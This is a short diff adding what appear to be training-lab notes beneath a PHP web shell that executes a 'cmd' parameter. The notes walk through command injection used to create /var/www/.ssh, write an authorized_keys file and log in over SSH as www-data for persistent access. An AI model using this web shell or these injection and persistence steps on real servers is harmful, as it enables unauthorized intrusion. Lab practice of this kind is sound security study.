@@ -34,3 +34,22 @@ if($_GET['cmd']) {
 ?>
 </pre>
 </BODY></HTML>
+
+# ssh-keygen
+ssh-keygen -t rsa -b 4096
+no pass phrase (enter,enter,enter)
+
+## from remote host(web browser), we need to upload our key 
+# make the directory, use www because that is the users home directory
+; mkdir /var/www/.ssh
+; ls -la /var/www
+
+# Get my key (Copy ALL of it from ssh-rsa to the end)
+cat /home/student/.ssh/id_rsa.pub
+
+# upload key 
+; echo "" > /var/www/.ssh/authorized_keys
+; cat /var/www/.ssh/authorized_keys
+
+# ssh into user that we are logging in as
+ssh -i .ssh/id_rsa -p <local rhp> www-data@<ip>
